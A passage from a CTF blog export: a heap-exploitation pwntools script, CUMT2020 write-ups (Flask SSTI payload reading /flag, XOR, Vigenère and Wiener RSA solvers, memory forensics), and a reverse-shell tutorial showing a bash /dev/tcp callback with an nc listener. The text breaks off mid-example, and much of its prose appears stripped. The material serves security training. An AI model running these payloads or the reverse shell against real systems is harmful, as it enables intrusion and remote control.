class=\"params\">(index)</span>:</span></span><br><span class=\"line\">      p.recvuntil(<span class=\"string\">b\"choice :\"</span>)</span><br><span class=\"line\">      p.sendline(<span class=\"string\">b\"3\"</span>)</span><br><span class=\"line\">      p.recvuntil(<span class=\"string\">b\"Index :\"</span>)</span><br><span class=\"line\">      p.sendline(index)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p.interactive()</span></span><br><span class=\"line\">add_note(<span class=\"string\">b\"16\"</span>,<span class=\"string\">b\"aaaaa\"</span>)</span><br><span class=\"line\">add_note(<span class=\"string\">b\"16\"</span>,<span class=\"string\">b\"aaaaa\"</span>)</span><br><span class=\"line\">delete_note(<span class=\"string\">b'0'</span>)</span><br><span class=\"line\">delete_note(<span class=\"string\">b'1'</span>)</span><br><span class=\"line\">add_note(<span class=\"string\">b'8'</span>,p32(pfputs)+p32(read_got))</span><br><span class=\"line\">print_note(<span class=\"string\">b'0'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">pfread = u32(p.recv()[<span class=\"number\">0</span>:<span class=\"number\">4</span>])</span><br><span class=\"line\">pfsys = pfread - <span class=\"number\">0xd41c0</span> + <span class=\"number\">0x3a940</span></span><br><span class=\"line\"><span class=\"comment\">#p.interactive()</span></span><br><span class=\"line\">delete_note(<span class=\"string\">b'2'</span>)</span><br><span class=\"line\"><span class=\"comment\">#p.interactive()</span></span><br><span class=\"line\"><span class=\"comment\">#p.recv()</span></span><br><span class=\"line\"><span class=\"comment\">#p.interactive()</span></span><br><span class=\"line\">add_note(<span class=\"string\">b'8'</span>,p32(pfsys)+<span class=\"string\">b\"||sh\"</span>)</span><br><span class=\"line\">print_note(<span class=\"string\">b'0'</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>       </p>\n","categories":["PWN"],"tags":["PWN"]},{"title":"CUMT2020","url":"https://pz1o.top/2020/10/24/CUMT2020/","content":"<a id=\"more\"></a>\n<h1 id=\"CUMT\"><a href=\"#CUMT\" class=\"headerlink\" title=\"CUMT\"></a>CUMT</h1><p>web</p>\n<h1 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h1><h2 id=\"babyflask\"><a href=\"#babyflask\" class=\"headerlink\" title=\"babyflask\"></a>babyflask</h2><p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;name&#x3D;&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(40)(%27&#x2F;flag%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"doge\"><a href=\"#doge\" class=\"headerlink\" title=\"doge\"></a>doge</h2><p>f12flag</p>\n<h1 id=\"re\"><a href=\"#re\" class=\"headerlink\" title=\"re\"></a>re</h1><h2 id=\"hello-world\"><a href=\"#hello-world\" class=\"headerlink\" title=\"hello_world\"></a>hello_world</h2><p></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">d=[]</span><br><span class=\"line\">b = <span class=\"string\">\"is_easy_right?\"</span></span><br><span class=\"line\">a = [<span class=\"string\">'2A'</span>, <span class=\"string\">'26'</span>, <span class=\"string\">'12'</span>, <span class=\"string\">'31'</span>, <span class=\"string\">'1A'</span>, <span class=\"string\">'7'</span>, <span class=\"string\">'11'</span>, <span class=\"string\">'3A'</span>, <span class=\"string\">'2D'</span>, <span class=\"string\">'0F'</span>, <span class=\"string\">'0E'</span>,<span class=\"string\">'1A'</span>, <span class=\"string\">'41'</span>, <span class=\"string\">'4B'</span>, <span class=\"string\">'36'</span>, <span class=\"string\">'43'</span>, <span class=\"string\">'31'</span>, <span class=\"string\">'0'</span>, <span class=\"string\">'3E'</span>, <span class=\"string\">'16'</span>, <span class=\"string\">'17'</span>, <span class=\"string\">'35'</span>,<span class=\"string\">'1D'</span>, <span class=\"string\">'10'</span>, <span class=\"string\">'38'</span>, <span class=\"string\">'11'</span>, <span class=\"string\">'44'</span>, <span class=\"string\">'4A'</span>, <span class=\"string\">'1B'</span>, <span class=\"string\">'2C'</span>, <span class=\"string\">'2B'</span>, <span class=\"string\">'17'</span>,<span class=\"string\">'50'</span>,<span class=\"string\">'3'</span>, <span class=\"string\">'4'</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">    c = <span class=\"string\">''</span></span><br><span class=\"line\">    z = x</span><br><span class=\"line\">    c += <span class=\"string\">'0x'</span></span><br><span class=\"line\">    c +=z</span><br><span class=\"line\">    d.append(c)</span><br><span class=\"line\">d = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">35</span>):</span><br><span class=\"line\">    c = int(a[i],<span class=\"number\">16</span>)</span><br><span class=\"line\">    m = i%<span class=\"number\">14</span></span><br><span class=\"line\">    print(chr(ord((b[m]))^c),end=<span class=\"string\">''</span>)</span><br></pre></td></tr></table></figure>\n<h2 id=\"non-name\"><a href=\"#non-name\" class=\"headerlink\" title=\"non_name\"></a>non_name</h2><p></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b = [<span class=\"number\">12</span>, <span class=\"number\">32</span>, <span class=\"number\">34</span>, <span class=\"number\">12</span>, <span class=\"number\">53</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">34</span>, <span class=\"number\">45</span>, <span class=\"number\">56</span>, <span class=\"number\">32</span>, <span class=\"number\">85</span>, <span class=\"number\">43</span>]</span><br><span class=\"line\">c = [<span class=\"string\">'a'</span>,<span class=\"string\">'b'</span>,<span class=\"string\">'c'</span>,<span class=\"string\">'d'</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">4</span>):</span><br><span class=\"line\">    sum1 = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">4</span>):</span><br><span class=\"line\">        print(<span class=\"string\">\"%s*%s\"</span>%(b[i*<span class=\"number\">4</span>+j],c[j]),end=<span class=\"string\">'+'</span>)</span><br><span class=\"line\">    print(<span class=\"string\">'\\n'</span>)</span><br><span class=\"line\"><span class=\"comment\">#116 103 102 114</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"crypto\"><a href=\"#crypto\" class=\"headerlink\" title=\"crypto\"></a>crypto</h1><h2 id=\"Classical\"><a href=\"#Classical\" class=\"headerlink\" title=\"Classical\"></a>Classical</h2><p>down</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cipher = <span class=\"string\">\"Elxyi lrw fqfjyxl pr wixx yajy chb qtsk lqfjzrx zs xuua vafe chb nfsl pcgy es ipgv tzxo ywzq rvyc djxcfx lrw oyr tzxo ytc vxhp! Orwto pmlx rvy hafm vh icitt;kz wzxtx dzy phre tg zq;uj hlta czu otpm yz fx,iinamlg rtf ltci zndr qgj wmyl eyd ggg vmlrvl xz dg tne ysi momygk rqn blrm as oo.Eta rtf ltci pngnia mltiprpsk mq ffvi rvy dwwxv,xszyzo xciseu mt xedl czu kmthsr,igvyrh khtkth xh ripp qhw azxeg,lrzuya jhup xh teve qhw afatr? Hphaql rny jsnywplx bp hysikzwsowl.Ky dzy yliw tztv by sykaw jom,bv iwzftipj hmkvl ysi halpr hxtlty, xhv.Xse ztrinpwm vj aeginx izrm uineklcknwc ahzp tzx dxxe sy lzprqmjbsr;xalc uukm otpp xal qzsl hh xapvraltny mjty nsflw llggi mmpmk dej.Hsirbspwl smps xht mmzwx dlz cjr,vatdi pos sujm, vatdi pos sanx uxfcgalh,lnv mjhxp aav llvw mtbjo,jhy sylq mjxd neg htarwvktyp xal mxpgkvtsni hm tpoheg.pmz ltci eomvjxi elxpv winxu.Etgi ulktnk pkmm l wfppp,gjhyl btxa h otsk tpw jyhl dmeh s mgtw.Elx ivtgzmgly qymbvp waen tqherz fp bslgw ty e yvvrolmgg ulwm, fsf csgv zt zr plpw if ekyjfrmpp jom egm lz sy fsfr htum klmebvps sgf ajlvmhgsek.Tpw ny xal iyd, A to zqlh mv xpld rqn ysi VBQECLY kl JynhfXseNbixspvxJmahwk.Dr ysi phc, ceexoujc xh bwp bjtexx miyvvp smuobyemgn.\"</span></span><br><span class=\"line\"><span class=\"comment\"># coding: utf-8</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">encrypt</span><span class=\"params\">(message, key)</span>:</span></span><br><span class=\"line\">    cipher = <span class=\"string\">''</span></span><br><span class=\"line\">    j = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(message)):</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> key[j % len(key)].islower():</span><br><span class=\"line\">            offset = ord(key[j % len(key)]) - ord(<span class=\"string\">'a'</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> key[j % len(key)].isupper():</span><br><span class=\"line\">                offset = ord(key[j % len(key)]) - ord(<span class=\"string\">'A'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                offset = ord(key[j % len(key)]) - <span class=\"number\">48</span></span><br><span class=\"line\"></span><br><span class=\"line\">        j += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> message[i].isalpha():</span><br><span class=\"line\">            <span class=\"keyword\">if</span> message[i].islower():</span><br><span class=\"line\">                cipher += chr((ord(message[i]) - ord(<span class=\"string\">'a'</span>) + offset) % <span class=\"number\">26</span> + ord(<span class=\"string\">'a'</span>))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                cipher += chr((ord(message[i]) - ord(<span class=\"string\">'A'</span>) + offset) % <span class=\"number\">26</span> + ord(<span class=\"string\">'A'</span>))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            cipher += message[i]</span><br><span class=\"line\">            j -= <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> cipher</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decrypt</span><span class=\"params\">(cipher, key)</span>:</span></span><br><span class=\"line\">    explain = <span class=\"string\">''</span></span><br><span class=\"line\">    j = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(cipher)):</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> key[j % len(key)].islower():</span><br><span class=\"line\">            offset = ord(key[j % len(key)]) - ord(<span class=\"string\">'a'</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> key[j % len(key)].isupper():</span><br><span class=\"line\">                offset = ord(key[j % len(key)]) - ord(<span class=\"string\">'A'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                offset = ord(key[j % len(key)]) - <span class=\"number\">48</span></span><br><span class=\"line\">        j += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> cipher[i].isalpha():</span><br><span class=\"line\">            <span class=\"keyword\">if</span> cipher[i].islower():</span><br><span class=\"line\">                explain += chr((ord(cipher[i]) - ord(<span class=\"string\">'a'</span>) - offset) % <span class=\"number\">26</span> + ord(<span class=\"string\">'a'</span>))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                explain += chr((ord(cipher[i]) - ord(<span class=\"string\">'A'</span>) - offset) % <span class=\"number\">26</span> + ord(<span class=\"string\">'A'</span>))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            explain += cipher[i]</span><br><span class=\"line\">            j -= <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> explain</span><br><span class=\"line\"></span><br><span class=\"line\">print(decrypt(cipher,<span class=\"string\">'Lethelastctf'</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">CUMTCTF&#123;EnjoyTheVigenereCipher&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"ezRSA\"><a href=\"#ezRSA\" class=\"headerlink\" title=\"ezRSA\"></a>ezRSA</h2><p>e</p>\n<p>wiener attack</p>\n<p>down</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\">Created on Dec 14, 2011</span><br><span class=\"line\"></span><br><span class=\"line\">@author: pablocelayes</span><br><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">import ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</span><br><span class=\"line\"></span><br><span class=\"line\">def hack_RSA(e,n):</span><br><span class=\"line\">    &#39;&#39;&#39;</span><br><span class=\"line\">    Finds d knowing (e,n)</span><br><span class=\"line\">    applying the Wiener continued fraction attack</span><br><span class=\"line\">    &#39;&#39;&#39;</span><br><span class=\"line\">    frac &#x3D; ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class=\"line\">    convergents &#x3D; ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class=\"line\">    </span><br><span class=\"line\">    for (k,d) in convergents:</span><br><span class=\"line\">        </span><br><span class=\"line\">        #check if d is actually the key</span><br><span class=\"line\">        if k!&#x3D;0 and (e*d-1)%k &#x3D;&#x3D; 0:</span><br><span class=\"line\">            phi &#x3D; (e*d-1)&#x2F;&#x2F;k</span><br><span class=\"line\">            s &#x3D; n - phi + 1</span><br><span class=\"line\">            # check if the equation x^2 - s*x + n &#x3D; 0</span><br><span class=\"line\">            # has integer roots</span><br><span class=\"line\">            discr &#x3D; s*s - 4*n</span><br><span class=\"line\">            if(discr&gt;&#x3D;0):</span><br><span class=\"line\">                t &#x3D; Arithmetic.is_perfect_square(discr)</span><br><span class=\"line\">                if t!&#x3D;-1 and (s+t)%2&#x3D;&#x3D;0:</span><br><span class=\"line\">                    print(&quot;Hacked!&quot;)</span><br><span class=\"line\">                    return d</span><br><span class=\"line\"></span><br><span class=\"line\"># TEST functions</span><br><span class=\"line\"></span><br><span class=\"line\">def test_hack_RSA():</span><br><span class=\"line\">    print(&quot;Testing Wiener Attack&quot;)</span><br><span class=\"line\">    times &#x3D; 5</span><br><span class=\"line\">    </span><br><span class=\"line\">    while(times&gt;0):</span><br><span class=\"line\">        e,n,d &#x3D; RSAvulnerableKeyGenerator.generateKeys(1024)</span><br><span class=\"line\">        print(&quot;(e,n) is (&quot;, e, &quot;, &quot;, n, &quot;)&quot;)</span><br><span class=\"line\">        print(&quot;d &#x3D; &quot;, d)</span><br><span class=\"line\">    </span><br><span class=\"line\">        hacked_d &#x3D; hack_RSA(e, n)</span><br><span class=\"line\">    </span><br><span class=\"line\">        if d &#x3D;&#x3D; hacked_d:</span><br><span class=\"line\">            print(&quot;Hack WORKED!&quot;)</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            print(&quot;Hack FAILED&quot;)</span><br><span class=\"line\">        </span><br><span class=\"line\">        print(&quot;d &#x3D; &quot;, d, &quot;, hacked_d &#x3D; &quot;, hacked_d)</span><br><span class=\"line\">        print(&quot;-------------------------&quot;)</span><br><span class=\"line\">        times -&#x3D; 1</span><br><span class=\"line\">    </span><br><span class=\"line\">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class=\"line\">    n &#x3D; 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597</span><br><span class=\"line\">    e &#x3D; 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span><br><span class=\"line\">    c &#x3D; 235079473042454099807116076488262740135383858230967099540307826273199444131724945298259060669497025680602868465015609167157760611830665379910856647739895018654389167886359502125262006498872925841789249028759026079722290718145036644959479543255350040619949567107916725017078853648984759794085772688267388901151</span><br><span class=\"line\">    #test_is_perfect_square()</span><br><span class=\"line\">    d &#x3D; 8264667972294275017293339772371783322168822149471976834221082393409363691895</span><br><span class=\"line\">    m &#x3D; pow(c,d,n)</span><br><span class=\"line\">    def num2str(num):</span><br><span class=\"line\">        tmp &#x3D; hex(num)[2:].replace(&quot;L&quot;,&quot;&quot;)</span><br><span class=\"line\">        if(len(tmp))%2 &#x3D;&#x3D;0:</span><br><span class=\"line\">            return tmp.decode(&quot;hex&quot;)</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            return (&quot;0&quot;+tmp).decode(&quot;hex&quot;)</span><br><span class=\"line\">    print(num2str(m))</span><br><span class=\"line\">    #print(&quot;-------------------------&quot;)</span><br><span class=\"line\">    #print(hack_RSA(e,n))</span><br><span class=\"line\"></span><br><span class=\"line\">CUMTCTF&#123;1bc205a110e6643137e045b8268b4ace&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"misc\"><a href=\"#misc\" class=\"headerlink\" title=\"misc\"></a>misc</h1><h2 id=\"Sign-In\"><a href=\"#Sign-In\" class=\"headerlink\" title=\"Sign In\"></a>Sign In</h2><p>base64brainfk</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CUMTCTF&#123;Welcome_to_CUMTCTF_2020_Final&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>httpbase64</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;WirRSharK_S0_E45y&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"LSB\"><a href=\"#LSB\" class=\"headerlink\" title=\"LSB\"></a>LSB</h2><p>LSB</p>\n<p>red green blue 0 0 0</p>\n<p> flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cumtctf&#123;1sb_i4_s0_Ea4y&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h2><p></p>\n<p>passcumt</p>\n<p>flag</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python vol.py -f memory.img imageinfo</span><br><span class=\"line\">python vol.py -f memory.img --profile=Win2003SP0x86 filescan |grep flag</span><br></pre></td></tr></table></figure>\n<p>flag.png</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 dumpfiles -D .&#x2F; -Q 0x000000000484f900</span><br></pre></td></tr></table></figure>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;</span><br></pre></td></tr></table></figure>\n<p></p>\n<p>flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 windows | grep flag</span><br></pre></td></tr></table></figure>\n<p>dump</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 memdump -D .&#x2F; -p 1992</span><br></pre></td></tr></table></figure>\n<p>foremost</p>\n<p></p>\n<p>keyvi AES</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">key:Th1s_1s_K3y00000</span><br><span class=\"line\">vi:1234567890123456</span><br><span class=\"line\">base64:jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;</span><br><span class=\"line\"></span><br><span class=\"line\">flag&#123;F0uNd_s0m3th1ng_1n_M3mory&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>010secret.png</p>\n<p>7a74</p>\n<p>secret.png</p>\n<p></p>\n<p>steg</p>\n<p>flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;yanji4n_bu_we1shi&#125;</span><br></pre></td></tr></table></figure>\n","categories":["CTF"],"tags":["WP"]},{"title":"shell","url":"https://pz1o.top/2020/10/03/shell/","content":"<a id=\"more\"></a>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p>shellshell</p>\n<h1 id=\"shell\"><a href=\"#shell\" class=\"headerlink\" title=\"shell\"></a>shell</h1><p>ShellShellkaliShellattachwinwinshell</p>\n<p><strong></strong></p>\n<p><strong>kali</strong></p>\n<p><strong>win</strong></p>\n<p>kali192.168.202.129</p>\n<p>win169.254.158.23</p>\n<h2 id=\"bashshell\"><a href=\"#bashshell\" class=\"headerlink\" title=\"bashshell\"></a><strong>bashshell</strong></h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/169.254.158.23/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>bash8080TCP 8080 tcp 8080bash </p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h3><p>win8080</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -nvlp 8080</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>-n: dnsip no dns</p>\n<p>-v:  verbose</p>\n<p>-l:   listen</p>\n<p>-p:  port</p>\n</blockquote>\n<p>kali</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;169.254.158.23&#x2F;8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p></p>\n<p><img src=\"/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002205548782.png\" alt=\"image-20201002205548782\"></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<p><img src=\"/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002205958997.png\" alt=\"image-20201002205958997\"></p>\n<p><strong>linux</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0 - stdin ,&lt;&lt;&lt;</span><br><span class=\"line\">1 - stdout ,&gt;&gt;&gt;</span><br><span class=\"line\">2 - stderr ,2&gt;2&gt;&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>>&amp;</strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&amp;</span><br><span class=\"line\">&gt;&amp;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">&amp;&gt;</span></span><br><span class=\"line\">root@kali:/var/www/html# ls  //1.php</span><br><span class=\"line\">flag.php  index.php</span><br><span class=\"line\">root@kali:/var/www/html# cat 1.php 2&gt;1  //1</span><br><span class=\"line\">root@kali:/var/www/html# cat 1</span><br><span class=\"line\">cat: 1.php: </span><br><span class=\"line\">root@kali:/var/www/html# cat 1.php 2&gt;&amp;1  //</span><br><span class=\"line\">cat: 1.php: 